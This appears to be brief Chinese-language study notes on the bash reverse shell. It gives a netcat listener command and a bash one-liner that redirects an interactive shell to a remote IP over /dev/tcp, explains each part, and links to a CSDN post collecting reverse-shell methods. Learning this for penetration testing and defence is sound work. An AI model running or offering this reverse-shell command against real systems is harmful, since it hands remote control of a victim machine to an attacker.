
# bash 反弹

```
攻击者：nc -lvp 9999

受害者：bash -i >& /dev/tcp/192.168.203.143/9999 0>&1

nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口
-l 监听模式，用于入站连接
-v 详细输出--用两个-v可得到更详细的内容
-p port 本地端口号

bash -i代表在本地打开一个bash
>&后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程vps
/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接
远程vps开启对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出
```

[反弹shell汇总，看我一篇就够了_getshell和反弹shell_lainwith的博客-CSDN博客](https://blog.csdn.net/weixin_44288604/article/details/111740527)